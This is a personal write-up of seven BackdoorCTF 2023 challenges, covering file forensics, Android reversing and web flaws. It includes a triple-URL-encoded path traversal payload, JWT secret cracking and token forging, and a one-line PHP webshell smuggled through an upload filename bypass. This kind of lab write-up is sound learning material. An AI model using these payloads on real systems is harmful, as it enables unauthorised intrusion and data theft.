I participated in the BackdoorCTF 2023, which was my first CTF in a year. For a first time back, me and my teammate got 7 flags. The following is a writeup/walkthrough of how each flag was grabbed and the thought process for each.

## Beginner/Beginner-menace (716 solves)

We are supplied a JPEG only, called `friend.jpeg`. My first thought is to check EXIF on the JPEG.

```
$ exiftool friend.jpeg
ExifTool Version Number         : 12.70

```
Looking at the EXIF, the `Artist` entry has the flag for us!

## Beginner/Headache (351 solves)
Created by: `Sl4y3r_07`
> I've had a headache since last evening. Is there a magic spell that can cure it immediately?

At an original look at this challenge I got stumped for a while overlooking something very minor...

We start with a seemingly 'corrupt' file, `chal.png` which doesn't open. I check EXIF first:

```
$ exiftool chal.png
ExifTool Version Number         : 12.70
File Name                       : chal.png
Directory                       : .

File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png

Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 1265x687
Megapixels                      : 0.869
```
Nothing... Anything trying binwalk?
```
$ binwalk -e chal.png
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
41            0x29            Zlib compressed data, compressed
```
Nothing of interest in the data... So here I get stumped until I decide to check the bytes...

Files have 'signatures' (magic numbers). PNGs magic numbers are `89 50 4e 47 0d 0a 1a 0a`. This does not match our files magic numbers (`ae 71 00 ff 3d 62 24 6d`)

So... I change the files magic bytes to be the correct bytes, and we get the following image (that opens!).

![Image after fixing magic bytes](headache.png)

There's our flag! <mark>flag{sp3ll_15_89_50_4E_47}</mark>

## Beginner/secret_of_j4ck4l (326 solves)
Created by: `j4ck4l`

> I left a message for you. You will love it definitely

`http://x.x.x.x:8003/read_secret_message?file=message`

This is a website that seems to read a local file from a parameter `file`, so immediately keeping an eye out for LFI before looking at the source code.

The code has a very... interesting filtering system.
```python
def ignore_it(file_param):
	yoooo = file_param.replace('.', '').replace('/', '')
	if yoooo != file_param:
		return "Illegal characters detected in file parameter!"
	return yoooo

def another_useless_function(file_param):
	return urllib.parse.unquote(file_param)

def useless (file_param):
	file_param1 = ignore_it(file_param)
	file_param2 = another_useless_function(file_param1)
	file_param3 = ignore_it(file_param2)
	file_param4 = another_useless_function(file_param3)
	file_param5 = another_useless_function(file_param4)
	return file_param5
```

The issue with this 'filtering' is its incredibly reliant on just, hoping nobody tests it. The `ignore_it` function filters all instances of `.` and `/` found in the URL, but not for recursive URL encoding. 
Due to % in hex being `25` we can apply repeated url encoding to get our payload to bypass the filter.

Payload: `%25252e%25252e%25252fflag%25252etxt`

In the server the payload is parsed as follows: (each line is a line in the 'useless' function)

```
file_param = %25252e%25252e%25252fflag%25252etxt
fileparam1 = %252e%252e%252fflag%252etxt
fileparam2 = %2e%2e%2fflag%2etxt
fileparam3 = %2e%2e%2fflag%2etxt
fileparam4 = ../flag.txt
fileparam5 = ../flag.txt
```

After sending we get our flag back: <mark>flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}</mark>

## Rev/Open Sesame (192 solves)
Created by: `Sl4y3r_07`

> Whisper the phrase, unveil with 'Open Sesame

I went into this flag with no previous Android application knowledge, so I learnt this one on the fly!

After downloading and seeing `open_sesame.apk` I immediately opened it with jadx. I searched for the 'flag' phrase in the code and found an entry with some code.

```java
public void validateCredentials() {
	String trim = this.editTextUsername.getText().toString().trim();
	String trim2 = this.editTextPassword.getText().toString().trim();
	if (trim.equals(valid_user) && n4ut1lus(trim2)) {
		String str = "flag{" + flag(Integer.toString(sl4y3r(sh4dy(trim2))), "U|]rURuoU^PoR_FDMo@X]uBUg") + "}";
		return;
	}
	showToast("Invalid credentials. Please try again.");
}
```
and up the top, some credentials...

```java
private static final int[] valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97};
private static final String valid_user = "Jack Ma";
```
The app takes a password and username. In the password is an unknown value (`AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR`) which can be found by searching for the value in the code, which returns the value `108`.

Username: We are given, `Jack Ma`

Password: Encoded in decmial! `52 108 49 98 97 98 97` -> `4l1baba`.

Now, how to show the flag..?

I did this by decompiling the APK with apktool (`apktool d open_sesame.apk`) and editing the Smali code to show the flag as a toast! Changing just before `goto :goto_56` to add these lines will display the flag as a toast upon correct credential entry.

```
move-result-object v0

invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
```

Then recompiling (`apktool b open_sesame -o open_sesame_repack.apk`), executing the APK and putting in the correct credentials shows our flag!

Flag: <mark>flag{aLiBabA_and_forty_thiEveS}</mark>

## Beginner/Secret-of-Kuruma (177 solves)
Created by: `h4l0gen`
> Madara attacked leaf village. everyone wants Naruto to turn into Nine-Tails, Naruto don't know what's the SECRET to change its role to 'NineTails'? can you as a shinobi help Naruto??? username: Naruto Password: Chakra

We are given a webpage with a username password field and some creds to start (`Naruto:Chakra`). After logging in two hyperlinks are provided, one being of interest, `/secret_of_Kuruma`. 

Looking at the cookies we see a `jwt_token`. If we look at the data (using [jwt.io](https://jwt.io)) we see its a HMAC256 and has a username and role field.

```json
{
	"username": "Naruto",
	"role": "shinobi"
}
```

The challenge is trying to get us NineTails role, so we need to break the SHA256 on it. I saved the JWT and used `john` with the [rockyou wordlist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz) to bruteforce it.
```
$ hashcat -a 0 -m 16500 jwt.hash ~/.../SecLists/Passwords/Leaked-Databases/rockyou.txt
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
```

This gives us the password: `minato`. We can then use [jwt.io](https://jwt.io/) to remake the JWT with our role: `NineTails!`

We are then given our flag: <mark>flag{y0u_ar3_tru3_L34F_sh1n0b1_bf56gtr59894}</mark>

## web/php_sucks (124 solves)
Created by: `j4ck4l`

> I hate PHP, and I know you hate PHP too. So, to irritate you, here is your PHP webapp. Go play with it

We are given some source code, and the website is a file uploader which takes a name and a file.

![Upload Page](php_sucks_1.png)

Looking at the code in PHP a specific line catches my eye almost immediately.

```php
$fileName=strtok($fileName,chr(7841151584512418084));
```

The `chr(...)` aspect resolves to `$`, and the PHP function `strtok` splits a string at the deliminator, and takes the first half. 

Immediately an exploit is brewing... 

In theory if we uploaded a file with a JPEG/PNG MIME type and had the PHP code change the extension to a `.php`, we could have Command Injection!

I rename a PNG on my computer to `file.php$.png` to test my theory. 
The PHP code should split at the `$` and take the first half (`file.php`).

![Exploit Testing](php_sucks_2.png)

It works!

Looking at our image restrictions (content type & file extension detection), I get a small PHP webshell (``<?=`$_GET[0]`?>``) and smuggle it inside my PNG file.

Once uploaded we send our payload to read the flag: `cat ../../ s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt`

Which gives us the flag: <mark>flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}</mark>

## Rev/sl4ydroid (55 solves)
Created by: `Sl4y3r_07`

> This challenge has got some Rizz !!

The app (on startup) displays this.

![Initial Display](sl4ydroid_1.png)

I opened the apk with jadx and had a look through the functions on `MainActivity` and noticed this particular portion.

```java
public void onCreate(Bundle savedInstanceState) {
	super.onCreate(savedInstanceState);
	setContentView(C0567R.layout.activity_main);
	TextView textView = (TextView) findViewById(C0567R.C0570id.displayTextView);
	this.displayTextView = textView;
	textView.setVisibility(8);
	TextView textView2 = (TextView) findViewById(C0567R.C0570id.textView);
	this.textView = textView2;
	textView2.setText(getResources().getString(C0567R.string.message));
	kim(getResources().getString(C0567R.string.f116k1));
	nim(getResources().getString(C0567R.string.f117n1));
	damn(getResources().getString(C0567R.string.f115d1));
	m105k2(getResources().getString(C0567R.string.k21));
}
```

The app shows some text normally, and we can see some texts visibility being edited and some text being shown.

I connect my phone and prepare an ADB bridge with jadx. Looking through the Smali I put a breakpoint at:

 - line 225 (`invoke-virtual      {v0, v1}, Landroid/widget/TextView;->setVisibility(I)V`)
 - line 238 (`invoke-virtual      {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V`)

On the first breakpoint shows setting the visibility. We change this (`v1`) to `0` to make it visible.

![Visibility Change Only](sl4ydroid_2.png)

On the second breakpoint we change this (`v1`) from `Flag will not display here.` to ` ` (a space), to make it invisible.

![Visibility Change + Removal of text](sl4ydroid_3.png)

Continuing past the breakpoints were shown our flag: <mark>flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}</mark>.
